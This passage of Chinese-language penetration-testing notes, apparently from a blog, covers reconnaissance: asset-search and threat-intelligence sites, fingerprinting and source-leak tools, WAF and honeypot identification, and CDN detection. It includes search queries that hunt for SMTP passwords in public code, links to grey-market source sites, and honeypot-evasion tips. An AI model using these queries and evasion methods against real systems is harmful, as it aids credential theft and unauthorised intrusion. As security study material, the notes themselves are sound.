<td><a href="https://fofa.info/">https://fofa.info/</a></td>
</tr>
<tr>
<td>全球鹰</td>
<td><a href="http://hunter.qianxin.com/">http://hunter.qianxin.com/</a></td>
</tr>
<tr>
<td>360</td>
<td><a href="https://quake.360.cn/quake/">https://quake.360.cn/quake/</a></td>
</tr>
<tr>
<td>钟馗之眼</td>
<td><a href="https://www.zoomeye.org/">https://www.zoomeye.org/</a></td>
</tr>
<tr>
<td>零零信安</td>
<td><a href="https://0.zone/">https://0.zone/</a></td>
</tr>
<tr>
<td>Shodan</td>
<td><a href="https://www.shodan.io/">https://www.shodan.io/</a></td>
</tr>
<tr>
<td>Censys</td>
<td><a href="https://censys.io/">https://censys.io/</a></td>
</tr>
<tr>
<td>ONYPHE</td>
<td><a href="https://www.onyphe.io/">https://www.onyphe.io/</a></td>
</tr>
<tr>
<td>FullHunt</td>
<td><a href="https://fullhunt.io/">https://fullhunt.io/</a></td>
</tr>
<tr>
<td>Soall Search Engine</td>
<td><a href="https://soall.org/">https://soall.org/</a></td>
</tr>
<tr>
<td>Netlas</td>
<td><a href="https://app.netlas.io/responses/">https://app.netlas.io/responses/</a></td>
</tr>
<tr>
<td>Leakix</td>
<td><a href="https://leakix.net/">https://leakix.net/</a></td>
</tr>
<tr>
<td>DorkSearch</td>
<td><a href="https://dorksearch.com/">https://dorksearch.com/</a></td>
</tr>
</tbody></table>
<h3 id="威胁情报"><a href="#威胁情报" class="headerlink" title="威胁情报"></a>威胁情报</h3><table>
<thead>
<tr>
<th>名称</th>
<th>地址</th>
</tr>
</thead>
<tbody><tr>
<td>微步在线 情报社区</td>
<td><a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></td>
</tr>
<tr>
<td>奇安信 威胁情报中心</td>
<td><a href="https://ti.qianxin.com/">https://ti.qianxin.com/</a></td>
</tr>
<tr>
<td>360 威胁情报中心</td>
<td><a href="https://ti.360.cn/#/homepage">https://ti.360.cn/#/homepage</a></td>
</tr>
<tr>
<td>VirusTotal 在线查杀平台</td>
<td><a href="https://www.virustotal.com/gui/">https://www.virustotal.com/gui/</a></td>
</tr>
<tr>
<td>VenusEye 威胁情报中心</td>
<td><a href="https://www.venuseye.com.cn/">https://www.venuseye.com.cn/</a></td>
</tr>
<tr>
<td>绿盟科技 威胁情报云</td>
<td><a href="https://ti.nsfocus.com/">https://ti.nsfocus.com/</a></td>
</tr>
<tr>
<td>IBM 情报中心</td>
<td><a href="https://exchange.xforce.ibmcloud.com/">https://exchange.xforce.ibmcloud.com/</a></td>
</tr>
<tr>
<td>天际友盟安全智能平台</td>
<td><a href="https://redqueen.tj-un.com/">https://redqueen.tj-un.com</a></td>
</tr>
<tr>
<td>华为安全中心平台</td>
<td><a href="https://isecurity.huawei.com/sec">https://isecurity.huawei.com/sec</a></td>
</tr>
<tr>
<td>安恒威胁情报中心</td>
<td><a href="https://ti.dbappsecurity.com.cn/">https://ti.dbappsecurity.com.cn/</a></td>
</tr>
<tr>
<td>AlienVault</td>
<td><a href="https://otx.alienvault.com/">https://otx.alienvault.com/</a></td>
</tr>
<tr>
<td>深信服</td>
<td><a href="https://sec.sangfor.com.cn/">https://sec.sangfor.com.cn/</a></td>
</tr>
<tr>
<td>丁爸情报分析师的工具箱</td>
<td><a href="http://dingba.top/">http://dingba.top/</a></td>
</tr>
<tr>
<td>听风者情报源 start.me</td>
<td><a href="https://start.me/p/X20Apn">https://start.me/p/X20Apn</a></td>
</tr>
<tr>
<td>GreyNoise Visualizer</td>
<td><a href="https://viz.greynoise.io/">https://viz.greynoise.io/</a></td>
</tr>
<tr>
<td>URLhaus 数据库</td>
<td><a href="https://urlhaus.abuse.ch/browse/">https://urlhaus.abuse.ch/browse/</a></td>
</tr>
<tr>
<td>Pithus</td>
<td><a href="https://beta.pithus.org/">https://beta.pithus.org/</a></td>
</tr>
</tbody></table>
<h3 id="枚举解析"><a href="#枚举解析" class="headerlink" title="枚举解析"></a>枚举解析</h3><table>
<thead>
<tr>
<th>名称</th>
<th>地址</th>
</tr>
</thead>
<tbody><tr>
<td>在线子域名查询</td>
<td><a href="http://tools.bugscaner.com/subdomain/">http://tools.bugscaner.com/subdomain/</a></td>
</tr>
<tr>
<td>DNSGrep 子域名查询</td>
<td><a href="https://www.dnsgrep.cn/subdomain">https://www.dnsgrep.cn/subdomain</a></td>
</tr>
<tr>
<td>工具强大的子域名收集器</td>
<td><a href="https://github.com/shmilylty/OneForAll">https://github.com/shmilylty/OneForAll</a></td>
</tr>
</tbody></table>
<h2 id="Web-架构资产"><a href="#Web-架构资产" class="headerlink" title="Web 架构资产"></a><strong>Web 架构资产</strong></h2><ol>
<li>程序语言 2. 框架源码 3. 搭建平台 4. 数据库类 5. 操作系统</li>
</ol>
<h3 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h3><table>
<thead>
<tr>
<th>名称</th>
<th>地址</th>
</tr>
</thead>
<tbody><tr>
<td>在线 cms 指纹识别</td>
<td><a href="http://whatweb.bugscaner.com/look/">http://whatweb.bugscaner.com/look/</a></td>
</tr>
<tr>
<td>Wappalyzer</td>
<td><a href="https://github.com/AliasIO/wappalyzer">https://github.com/AliasIO/wappalyzer</a></td>
</tr>
<tr>
<td>TideFinger 潮汐</td>
<td><a href="http://finger.tidesec.net/">http://finger.tidesec.net/</a></td>
</tr>
<tr>
<td>云悉指纹</td>
<td><a href="https://www.yunsee.cn/">https://www.yunsee.cn/</a></td>
</tr>
<tr>
<td>WhatWeb</td>
<td><a href="https://github.com/urbanadventurer/WhatWeb">https://github.com/urbanadventurer/WhatWeb</a></td>
</tr>
<tr>
<td>数字观星 Finger-P</td>
<td><a href="https://fp.shuziguanxing.com/#/">https://fp.shuziguanxing.com/#/</a></td>
</tr>
</tbody></table>
<h4 id="特殊场景"><a href="#特殊场景" class="headerlink" title="特殊场景"></a>特殊场景</h4><p>当web服务器是内网环境如何进行识别呢？</p>
<p>​	在线指纹识别平台是无法使用的，只能使用工具进行测试</p>
<p><a href="https://github.com/newbe3three/gotoscan">GitHub - newbe3three&#x2F;gotoscan: 由Go语言实现的一款CMS指纹识别工具。</a></p>
<p>使用方法：</p>
<blockquote>
<p>gotoscan.exe -host <a href="https://localhost.com/">https://localhost.com</a> </p>
<p>gotoscan.exe -hosts hosts.txt</p>
</blockquote>
<h3 id="框架源码"><a href="#框架源码" class="headerlink" title="框架源码"></a>框架源码</h3><h4 id="开源源码"><a href="#开源源码" class="headerlink" title="开源源码"></a>开源源码</h4><ul>
<li>利用指纹识别找到CMS</li>
<li>官网下载</li>
</ul>
<h4 id="闭源源码"><a href="#闭源源码" class="headerlink" title="闭源源码"></a>闭源源码</h4><h5 id="源码泄露"><a href="#源码泄露" class="headerlink" title="源码泄露"></a>源码泄露</h5><p>#后端-闭源-配置不当-源码泄漏</p>
<p>参考：<a href="https://www.secpulse.com/archives/124398.html">https://www.secpulse.com/archives/124398.html</a> </p>
<p>敏感目录文件扫描</p>
<p>​	CVS：<a href="https://github.com/kost/dvcs-ripper">https://github.com/kost/dvcs-ripper</a></p>
<p>​	GIT：<a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a></p>
<p>​	SVN：<a href="https://github.com/callmefeifei/SvnHack">https://github.com/callmefeifei/SvnHack</a></p>
<p>​	DS_Store：<a href="https://github.com/lijiejie/ds_store_exp">https://github.com/lijiejie/ds_store_exp</a></p>
<ul>
<li>.git泄露<ul>
<li>通过web站点扫描工具，扫到.git</li>
<li>使用githack进一步获取源码</li>
</ul>
</li>
<li>.svn泄露<ul>
<li>通过web站点扫描工具，扫到.svn</li>
<li>使用svnhacker进一步获取源码</li>
</ul>
</li>
<li>.ds_store泄露<ul>
<li>通过web站点扫描工具，扫到.ds_store</li>
<li>使用Dump all（源码泄露集成工具）</li>
</ul>
</li>
<li>网站压缩文件<ul>
<li>直接下载</li>
</ul>
</li>
<li>composer文件泄露（php特有）<ul>
<li>composer.josn就像是一个网站说明性文件，里面可能会包括源码</li>
</ul>
</li>
</ul>
<h5 id="码云资源搜索"><a href="#码云资源搜索" class="headerlink" title="码云资源搜索"></a>码云资源搜索</h5><p>1、提取特征关键文件</p>
<p>​	如网站的js文件名、脚本文件名</p>
<p>2、进行信息搜索（通过浏览网站页面获取）</p>
<p>​	查看是否存在QQ号、邮箱地址、作者名、关键注释信息</p>
<p>3、对收集的信息进行搜索</p>
<p>​	使用git、gitee、oschina</p>
<p><a href="https://0xdadream.github.io/2025/02/11/google-hacking-shi-yong-gai-jin-ban/">google hacking使用-改进版 | 逐梦</a></p>
<p>GITHUB资源搜索：</p>
<p>​	in:name test               #仓库标题搜索含有关键字</p>
<p>​	in:descripton test         #仓库描述搜索含有关键字</p>
<p>​	in:readme test             #Readme文件搜素含有关键字</p>
<p>​	stars:&gt;3000 test           #stars数量大于3000的搜索关键字</p>
<p>​	stars:1000..3000 test      #stars数量大于1000小于3000的搜索关键字 </p>
<p>​	forks:&gt;1000 test           #forks数量大于1000的搜索关键字</p>
<p>​	forks:1000..3000 test      #forks数量大于1000小于3000的搜索关键字 </p>
<p>​	size:&gt;&#x3D;5000 test           #指定仓库大于5000k(5M)的搜索关键字 </p>
<p>​	pushed:&gt;2019-02-12 test    #发布时间大于2019-02-12的搜索关键字 </p>
<p>​	created:&gt;2019-02-12 test   #创建时间大于2019-02-12的搜索关键字 </p>
<p>​	user:test                  #用户名搜素</p>
<p>​	license:apache-2.0 test    #明确仓库的 LICENSE 搜索关键字 </p>
<p>​	language:java test         #在java语言的代码中搜索关键字</p>
<p>​	user:test in:name test     #组合搜索,用户名test的标题含有test的</p>
<p>关键字配合谷歌搜索：</p>
<p>​	site:Github.com smtp  </p>
<p>​	site:Github.com smtp @qq.com  </p>
<p>​	site:Github.com smtp @126.com  </p>
<p>​	site:Github.com smtp @163.com  </p>
<p>​	site:Github.com smtp @sina.com.cn</p>
<p>​	site:Github.com smtp password</p>
<p>​	site:Github.com String password smtp</p>
<h4 id="黑产源码"><a href="#黑产源码" class="headerlink" title="黑产源码"></a>黑产源码</h4><ul>
<li><a href="https://00fb.com/">菲博源码网 - 菲博源码网-免费源码,棋牌源码,源码交易,交易平台,网站源码,源码下载</a></li>
<li><a href="https://www.huzhan.com/">互站网 - 国内知名的网站、域名、软件、APP源码交易平台</a></li>
<li><a href="https://www.aigei.com/game-code/code/card_match">棋牌卡牌 桌游 游戏源码 免费下载 - 爱给网</a></li>
</ul>
<h3 id="JS信息收集"><a href="#JS信息收集" class="headerlink" title="JS信息收集"></a>JS信息收集</h3><p>与后端语言的差异</p>
<p>​	后端语言：php、java、python、.NET 浏览器段看不到真实的源代码</p>
<p>​	前端语言：JS和JS框架 浏览器段可以看到真实的源代码</p>
<p>识别方法</p>
<ul>
<li>使用插件wappalyer</li>
<li>源代码简短</li>
<li>引入多个js文件（关注admin.js、login.js）</li>
<li>一般有&#x2F;static&#x2F;js&#x2F;app.js等顺序的js文件</li>
<li>一般有cookie中有connect.sid</li>
</ul>
<p>PHP等后端应用：Wappalyzer显示主要语言为PHP，JS仅作为辅助库，十有八九不是JS前端架构</p>
<p>纯前端应用：编程语言显示为JavaScript，框架显示Vue&#x2F;React等</p>
<p>常见框架</p>
<p>Vue、NodeJS、jQuery、Angular等</p>
<p>存在的安全隐患</p>
<ul>
<li>源代码泄露</li>
<li>未授权访问（js里面分析更多的url地址确定接口路径）</li>
<li>敏感key泄露（js文件中可能配置了接口信息如云应用、短信、邮箱、数据库等）</li>
<li>API接口安全（代码中加密提交的参数传递，更多的URL路径）</li>
</ul>
<h4 id="测试方法"><a href="#测试方法" class="headerlink" title="测试方法"></a>测试方法</h4><h5 id="人工测试"><a href="#人工测试" class="headerlink" title="人工测试"></a>人工测试</h5><p>浏览器：</p>
<ul>
<li>打开浏览器开发者工具（F12）</li>
<li>切换到Network面板筛选JS文件</li>
<li>重点分析包含关键字的文件（如login&#x2F;admin）</li>
<li>使用Ctrl+Shift+F全局搜索接口路径</li>
</ul>
<p>全局搜索关键字：</p>
<ul>
<li>src&#x3D;</li>
<li>path&#x3D;</li>
<li>method:”get”</li>
<li>http.get(“</li>
<li>method:”post”</li>
<li>http.post(“</li>
<li>$.ajax</li>
<li><a href="http://service.httppost/">http://service.httppost</a></li>
<li><a href="http://service.httpget/">http://service.httpget</a></li>
</ul>
<h5 id="Burp插件收集"><a href="#Burp插件收集" class="headerlink" title="Burp插件收集"></a>Burp插件收集</h5><p>HaE：<a href="https://github.com/gh0stkey/HaE">https://github.com/gh0stkey/HaE</a><br>    通过规则库正则匹配数据包中的敏感数据，并高亮展示匹配到的数据包。</p>
<p>BurpAPIFinder：<a href="https://github.com/shuanx/BurpAPIFinder">https://github.com/shuanx/BurpAPIFinder</a><br>    JS敏感信息匹配插件，且据作者说信息匹配除正则外还支持多种模式，集成了HaE、APIKit等敏感信息指纹等。</p>
<p>​	依据其配置文件规则匹配，听说该插件支持递归扫描、深入挖掘，因此能获取到更多的信息。不过缺点就是，扫描速度慢，刷新时内存占用高。</p>
<h5 id="自动化工具收集"><a href="#自动化工具收集" class="headerlink" title="自动化工具收集"></a>自动化工具收集</h5><p>浏览器插件 → FindSomething<br>    该插件会收集当前标签页源码&amp;JS链接，并将收集到的JS链接再次加载以获取JS源码，随后从获取到的html&amp;js源码中通过正则匹配其中的敏感信息并展示。</p>
<p>JSFinder：<a href="https://github.com/Threezh1/JSFinder">https://github.com/Threezh1/JSFinder</a><br>    依据正则检索Web js文件中的URL、子域名等信息。</p>
<p>URLFinder：<a href="https://github.com/pingc0y/URLFinder">https://github.com/pingc0y/URLFinder</a><br>    作者说由于JSFinder项目长时间无人维护，因此自己写了一个。项目较新，检索速度快&amp;内容多，对于自动化工具JS信息收集，更推荐该项目。	相较于JSFinder，使用URLFinder获取到的信息除URL&amp;子域名外，还有各种经规则匹配的敏感信息。</p>
<p>ffuf：<a href="https://github.com/ffuf/ffuf">https://github.com/ffuf/ffuf</a><br>    使用模糊测试的方法，通过大字典去跑目标Web可能存在的JS文件，主要针对部分JS文件可能存在但并未被发送至客户端的情况，从而获取更多信息。<br>    其实就跟目录扫描差不多，只不过这里扫的全是js文件罢了。由于使用ffuf需要提前准备字典，字典网站：<a href="https://wordlists.assetnote.io/">https://wordlists.assetnote.io/</a></p>
<p>Packer-Fuzzer：<a href="https://github.com/rtcatc/Packer-Fuzzer">https://github.com/rtcatc/Packer-Fuzzer</a><br>    由于WebPack会自动将打包后的JS代码进行混淆，导致上述JS信息收集方式收集到的信息不那么准确，因此针对WebPack站点，建议使用对口工具。Packer-Fuzzer，主要目标为WebPack站点，针对被打包的JS文件进行敏感信息收集，且支持部分漏洞检测，扫描完成后会自动生成检测报告。</p>
<p>​	该项目会先将整个WebPack打包文件拖下来，再对拖下来的文件内容进行收集敏感信息，最后给出报告。因此实际中使用该工具跑一遍站点速度较慢。</p>
<p>jjjjjjjjjjjjjs：<a href="https://github.com/ttstormxx/jjjjjjjjjjjjjs">https://github.com/ttstormxx/jjjjjjjjjjjjjs</a><br>针对WebPack站点的敏感信息收集工具。相较于Packer-Fuzzer，该项目仅匹配JS文件中的敏感信息，而不会拖取被打包文件</p>
<h3 id="框架组件"><a href="#框架组件" class="headerlink" title="框架组件"></a>框架组件</h3><p>识别框架能快速判断目标系统是否存在已知漏洞</p>
<p><strong>PHP开发框架</strong></p>
<p>​	ThinkPHP、Laravel、Yii</p>
<p><strong>Python开发框架</strong></p>
<p>​	Django和Flask</p>
<p><strong>Java开发框架</strong></p>
<ul>
<li>常见Web容器: Tomcat、JBoss、Jetty等是Java Web开发中常用的Web容器</li>
<li>数据库组件: Hibernate、MyBatis、MySQL、Oracle、SQL Server、PostgreSQL、MongoDB等是Java常用的数据库相关组件</li>
<li>缓存数据库: Redis是Java中常用的缓存数据库</li>
<li>消息队列: Kafka、RabbitMQ等消息队列组件</li>
<li>其他功能组件: 包括负载均衡、分布式数据库、日志收集、搜索类、系统监控、分库分表、微服务等各类功能组件</li>
</ul>
<p>Java组件	</p>
<ul>
<li><p>日志记录组件: Log4j、Logback、SLF4J等，用于实现日志记录功能</p>
</li>
<li><p>安全认证组件: JWT、Shiro等，用于用户认证和权限管理</p>
</li>
<li><p>文件处理组件: POI用于处理Office文件，PDFBox用于处理PDF文件</p>
</li>
<li><p>数据解析组件: Jackson、Fastjson、Gson等，用于JSON数据解析</p>
</li>
</ul>
<p>Web开发三种模型</p>
<ul>
<li>基础模型：完全手写功能代码，无框架和组件依赖（风险较高–&gt;常规代码审计）</li>
<li>以框架为核心实现功能（内置安全防护，漏洞可预测—&gt;历史漏洞利用）</li>
<li>框架+第三方组件（可能存在历史、版本漏洞—&gt;框架+组件组合测试）</li>
</ul>
<h4 id="Python框架"><a href="#Python框架" class="headerlink" title="Python框架"></a>Python框架</h4><h5 id="Django识别"><a href="#Django识别" class="headerlink" title="Django识别"></a>Django识别</h5><p>识别方法</p>
<ul>
<li>插件工具识别（如Wappalyzer）</li>
<li>数据包特征：Set-Cookie字段包含CSRF token等特定字段</li>
<li>管理页面路径通常包含”&#x2F;admin”</li>
<li>返回包头常见”X-Powered-By: Django”</li>
<li>页面底部可能显示”Django site admin”</li>
</ul>
<h5 id="Flask识别"><a href="#Flask识别" class="headerlink" title="Flask识别"></a>Flask识别</h5><p>识别方法</p>
<ul>
<li>数据包特征：ETag字段包含flask</li>
<li>插件工具识别（如Wappalyzer）</li>
<li>错误页面可能会显示Flask调试信息</li>
</ul>
<p>不是所有Flask应用都会暴露框架信息</p>
<h4 id="PHP框架"><a href="#PHP框架" class="headerlink" title="PHP框架"></a>PHP框架</h4><ul>
<li>插件直接识别ThinkPHP框架</li>
<li>返回包头包含”X-Powered-By: ThinkPHP”</li>
<li>特定错误页面样式</li>
<li>favicon.ico图标特征</li>
</ul>
<img src="/img/xiaodi/image-20250510100248245.png" alt="image-20250510100248245" style="zoom: 33%;" />





<p>这些固定特征通常出现在Cookie、响应头或HTML源代码中：</p>
<p>-Laravel<br> 包含”laravel_session”、”XSRF-TOKEN”等关键字<br> Set-Cookie: 含有XSRF-TOKEN、laravel_seesion等关键字<br>-Yii<br>  Set-Cookie: 包含”YII_CSRF_TOKEN”、”yii”等关键字<br>-ThinkPHP<br>  包含特定格式的Cookie或响应头</p>
<h4 id="JAVA识别"><a href="#JAVA识别" class="headerlink" title="JAVA识别"></a>JAVA识别</h4><p>识别方法</p>
<ul>
<li>通过数据包特征识别（如remember me字段识别Shiro）</li>
<li>通过URL后缀识别（如.do、.action识别Struts）</li>
<li>通过默认页面&#x2F;图标识别（如Spring Boot的默认错误页面和图标）</li>
<li>通过端口识别（如Solr默认端口8983）</li>
</ul>
<h5 id="FastJson-Jackson"><a href="#FastJson-Jackson" class="headerlink" title="FastJson&#x2F;Jackson"></a><strong>FastJson&#x2F;Jackson</strong></h5><p>在提交Json数据包中修改测试：</p>
<p>—FastJson组件会将01解析为1      F：  id：01 正常</p>
<p>—Jackson组件在解析01时会抛出异常    J： id：01 报错</p>
<h5 id="Shiro（验证用户身份的组件）"><a href="#Shiro（验证用户身份的组件）" class="headerlink" title="Shiro（验证用户身份的组件）"></a><strong>Shiro（验证用户身份的组件）</strong></h5><p>请求包的cookie中存在rememberMe字段</p>
<p>返回包中存在set-cookie：rememberMe&#x3D;deleteMe</p>
<p>请求包中存在rememberMe&#x3D;X时，响应包中存在rememberMe&#x3D;deleteMe</p>
<p>有时服务器不会主动返回rememberMe&#x3D;deleteMe，直接发包即可，将cookie内容改为rememberMe&#x3D;1，若响应包中有rememberMe&#x3D;deleteMe，基本可以确定网站是apache shiro搭建的</p>
<h5 id="Struts2"><a href="#Struts2" class="headerlink" title="Struts2"></a>Struts2</h5><p>使用Struts2框架后后缀一般带do或action</p>
<h5 id="Springboot"><a href="#Springboot" class="headerlink" title="Springboot"></a>Springboot</h5><p>1、通过web应用程序网页标签的小绿叶图标识别</p>
<p>2、通过Springboot框架默认的报错页面识别</p>
<h4 id="Solr"><a href="#Solr" class="headerlink" title="Solr"></a>Solr</h4><p>一般开放8983端口，访问页面也可以探针到</p>
<h4 id="其他思路"><a href="#其他思路" class="headerlink" title="其他思路"></a>其他思路</h4><p>1、使用CMS识别到源码体系TP开发</p>
<p>​	用cms进行识别，如识别出来是api admin但小程序核心仍然是ThinkPHP。</p>
<p>2、使用工具扫描</p>
<p>3、使用空间测绘搜索相关图标信息识别</p>
<img src="https://i-blog.csdnimg.cn/direct/80038c2ca6ec4984b74248cbc17706ab.png" alt="img" style="zoom: 25%;" />

<h2 id="WAF防火墙"><a href="#WAF防火墙" class="headerlink" title="WAF防火墙"></a>WAF防火墙</h2><p>定义: Web应用防火墙（Web Application Firewall，简称WAF），是专门保护Web应用的安全防护系统。</p>
<p>核心功能</p>
<ul>
<li>保护Web应用免受攻击</li>
<li>阻止常规攻击手段</li>
</ul>
<p>类比说明: 类似于电脑杀毒软件，但专门针对Web应用而非主机安全</p>
<p>保护范围</p>
<ul>
<li>仅保护Web应用层面</li>
<li>不保护主机渗透、数据库渗透等非Web应用攻击</li>
</ul>
<h3 id="WAF分类"><a href="#WAF分类" class="headerlink" title="WAF分类"></a>WAF分类</h3><ul>
<li>云WAF<ul>
<li>由云服务商提供（如腾讯云、阿里云、华为云、百度云、亚马逊云等）</li>
<li>集成在云产品中，用户不可见</li>
<li>有免费版和收费版</li>
</ul>
</li>
<li>硬件WAF<ul>
<li>由安全公司研发的专用硬件设备（如深信服、绿盟、永信至诚、知道创宇等）</li>
<li>部署在客户机房</li>
<li>升级可能需要更换设备</li>
</ul>
</li>
<li>软件WAF<ul>
<li>可下载安装的软件（如D盾、安全狗、宝塔等）</li>
<li>直接安装在服务器上</li>
</ul>
</li>
<li>代码级WAF<ul>
<li>通过代码实现的过滤规则</li>
<li>集成在网站源代码中</li>
</ul>
</li>
</ul>
<h3 id="WAF识别"><a href="#WAF识别" class="headerlink" title="WAF识别"></a>WAF识别</h3><p>识别方法</p>
<ul>
<li>拦截页面识别：通过观察网站拦截页面特征进行人工判断，不同WAF产品有独特的拦截界面样式</li>
<li>工具识别：使用自动化工具（如wafw00f）进行检测，支持国内外84种常见WAF产品的识别</li>
<li>网络空间测绘：通过搜索引擎查询目标网站使用的安全产品信息</li>
</ul>
<h4 id="工具识别"><a href="#工具识别" class="headerlink" title="工具识别"></a><strong>工具识别</strong></h4><p><strong>WAFW00F</strong></p>
<p><a href="https://github.com/EnableSecurity/wafw00f">GitHub - EnableSecurity&#x2F;wafw00f: WAFW00F allows one to identify and fingerprint Web Application Firewall (WAF) products protecting a website.</a></p>
<p>检测命令：</p>
<p>进入waf00f文件夹：python main.py 目标URL</p>
<p>支持列表：工具内置支持阿里云WAF、安全狗、华为云WAF、腾讯云WAF等国内外主流产品</p>
<p><strong>IdentYwaf</strong></p>
<p><a href="https://github.com/stamparm/identYwaf">GitHub - stamparm&#x2F;identYwaf: Blind WAF identification tool</a></p>
<p>检测命令</p>
<p>Usage: python identYwaf.py [options] &lt;host|url&gt;</p>
<h4 id="空间测绘平台"><a href="#空间测绘平台" class="headerlink" title="空间测绘平台"></a><strong>空间测绘平台</strong></h4><p>工作原理: 通过爬取互联网设备信息建立数据库</p>
<p><a href="https://quake.360.net/quake/#/index">360网络空间测绘 — 因为看见，所以安全</a></p>
<p><a href="https://fofa.info/">网络空间测绘，网络空间安全搜索引擎，网络空间搜索引擎，安全态势感知 - FOFA网络空间测绘系统</a></p>
<p><a href="https://hunter.qianxin.com/_blank">鹰图平台(hunter)-奇安信网络空间测绘系统</a></p>
<h2 id="蜜罐系统"><a href="#蜜罐系统" class="headerlink" title="蜜罐系统"></a>蜜罐系统</h2><p>常见蜜罐系统</p>
<ul>
<li>AMUN IMAP蜜罐</li>
<li>DIONAEA HTTP&#x2F;SMBD&#x2F;MSSQL&#x2F;Memcached&#x2F;FTP蜜罐</li>
<li>HONEYPY HTTP&#x2F;ES蜜罐</li>
<li>KIPPO SSH蜜罐</li>
<li>HFISH蜜罐管理后台</li>
<li>CONPOTS7工业控制系统蜜罐</li>
<li>ELASTICSEARCH蜜罐</li>
<li>WEBLOGIC蜜罐等</li>
</ul>
<p>本质：一种安全威胁检测技术，通过引诱和欺骗攻击者来记录其攻击手段</p>
<p>核心目的</p>
<ul>
<li>刻画攻击者画像</li>
<li>还原攻击手法</li>
<li>实现时间消耗战术</li>
</ul>
<p>分类标准：基于交互程度等级</p>
<ul>
<li>低交互蜜罐：仅建立单次连接（”简单玩一下就完了”）</li>
<li>中交互蜜罐：提供多阶段交互（”再玩一玩”）</li>
<li>高交互蜜罐：深度持续交互（”很深入的玩，像交朋友一年”）</li>
</ul>
<p>核心功能</p>
<ul>
<li>节点管理（可自定义开放端口）</li>
<li>攻击行为记录（包括IP、时间、尝试的凭证等）</li>
<li>实时攻击态势展示（大屏可视化）</li>
</ul>
<p>攻击模拟</p>
<ul>
<li>提供虚假登录界面（如admin&#x2F;admin）</li>
<li>记录所有异常访问尝试</li>
<li>生成攻击者指纹信息</li>
</ul>
<p>识别特征</p>
<ul>
<li>非常规端口服务（如4433）</li>
<li>过于明显的漏洞暴露</li>
<li>系统响应存在固定模式</li>
</ul>
<h3 id="蜜罐识别方法"><a href="#蜜罐识别方法" class="headerlink" title="蜜罐识别方法"></a>蜜罐识别方法</h3><h4 id="浏览器插件识别法"><a href="#浏览器插件识别法" class="headerlink" title="浏览器插件识别法"></a>浏览器插件识别法</h4><p><strong>Heimdallr</strong> </p>
<p><a href="https://github.com/Ghr07h/Heimdallr">GitHub - Ghr07h&#x2F;Heimdallr: 一款完全被动监听的谷歌插件，用于高危指纹识别、蜜罐特征告警和拦截、机器特征对抗</a></p>
<p>Heimdallr是一款致力于被动嗅探浏览器流量，用于提示漏洞框架指纹、告警拦截蜜罐请求、对抗浏览器特征追踪（浏览器持久化、webRTC、Canvas画布等）的Chrome插件。</p>
<ul>
<li>识别原理：通过检测指纹特征判断是否为蜜罐系统，会显示”敏感信息存在手机号码”等告警提示</li>
<li>准确性问题：存在较高误报率，例如打开微信公众号文章也可能被误判为蜜罐</li>
</ul>
<p><strong>Quake</strong></p>
<p><a href="https://github.com/360quake/quake_rs">GitHub - 360quake&#x2F;quake_rs: Quake Command-Line Application</a></p>
<blockquote>
<p>quake.exe init 【360quake apikey】</p>
<p>quake.exe honeypot 目标</p>
<p><img src="/img/xiaodi/image-20250508213352819.png" alt="image-20250508213352819"></p>
</blockquote>
<h4 id="空间测绘识别"><a href="#空间测绘识别" class="headerlink" title="空间测绘识别"></a>空间测绘识别</h4><p><a href="https://quake.360.net/quake/#/index">360网络空间测绘 — 因为看见，所以安全</a></p>
<p><a href="https://fofa.info/">网络空间测绘，网络空间安全搜索引擎，网络空间搜索引擎，安全态势感知 - FOFA网络空间测绘系统</a></p>
<p><a href="https://hunter.qianxin.com/_blank">鹰图平台(hunter)-奇安信网络空间测绘系统</a></p>
<p><img src="https://i-blog.csdnimg.cn/direct/1c9cc1a511ac49b79be2b5705fe79b03.png" alt="img"></p>
<h4 id="人工识别"><a href="#人工识别" class="headerlink" title="人工识别"></a>人工识别</h4><ul>
<li>端口特征分析<ul>
<li>多端口开放：蜜罐通常会开放大量端口（如80&#x2F;81&#x2F;82等连续端口）</li>
<li>规律性排列：端口号呈现规律性递增（如901&#x2F;902&#x2F;903…）</li>
<li>非标准端口：避免占用常见应用端口，使用非标准端口模拟服务</li>
</ul>
</li>
<li>Web访问特征<ul>
<li>协议异常：<strong>用HTTP协议访问非Web服务端口（如MySQL的3306）时会出现下载行为</strong></li>
<li>设计原理：蜜罐采用JSONP技术传输攻击者输入的账号密码，导致协议解析异常</li>
</ul>
</li>
<li>设备指纹识别<ul>
<li>特定返回值：不同蜜罐产品有固定指纹特征（如SSH蜜罐有特定banner）</li>
<li>产品特征库：需要收集整理各蜜罐产品的指纹特征进行比对</li>
</ul>
</li>
</ul>
<p>综合判定策略</p>
<ul>
<li>三重验证法<ul>
<li>使用网络空间测绘平台（如夸克、鹰图）初步识别</li>
<li>结合专用工具进行二次验证</li>
<li>最后通过人工分析端口特征、Web行为等确认</li>
</ul>
</li>
</ul>
<h2 id="CDN绕过"><a href="#CDN绕过" class="headerlink" title="CDN绕过"></a>CDN绕过</h2><h3 id="CDN基本概念"><a href="#CDN基本概念" class="headerlink" title="CDN基本概念"></a><strong>CDN基本概念</strong></h3><ul>
<li>传统访问模式：用户访问域名→解析服务器IP→直接访问目标主机</li>
<li>CDN访问模式：用户访问域名→CDN节点→真实服务器IP→访问目标主机</li>
<li>WAF防护模式：用户访问域名→CDN节点(WAF防护)→真实服务器IP→访问目标主机</li>
</ul>
<p><strong>配置方式</strong></p>
<p>CDN配置要素</p>
<ul>
<li>加速域名：需要启用加速的具体域名（如<a href="http://www.xiaodi8.com)/">www.xiaodi8.com）</a></li>
<li>加速区域：国内&#x2F;海外等不同地区的加速选择</li>
<li>加速类型：静态资源&#x2F;动态资源等不同类型的内容加速</li>
</ul>
<p>IP差异</p>
<ul>
<li>传统访问返回真实服务器IP（如47.75.212.15）</li>
<li>CDN访问返回虚拟节点IP（如202.96.134.33）</li>
</ul>
<p>信息收集失效：端口扫描等主机级信息收集会作用于CDN节点而非真实服务器</p>
<p>业务影响范围：仅影响IP相关资产探测，其他业务数据（如API接口）仍正常交互</p>
<h3 id="CDN判断技术"><a href="#CDN判断技术" class="headerlink" title="CDN判断技术"></a>CDN判断技术</h3><p><strong>Nslookup</strong></p>
<p>​	Win下使用nslookup命令进行查询，若返回域名解析结果为多个ip，多半使用了CDN，是不真实的ip。</p>
<p><strong>多地ping查询</strong></p>
<p>​	使用不同区域ping，查看ping的ip结果是否唯一。若不唯一，则目标网站可能存在CDN。</p>
<p>查询网站：</p>
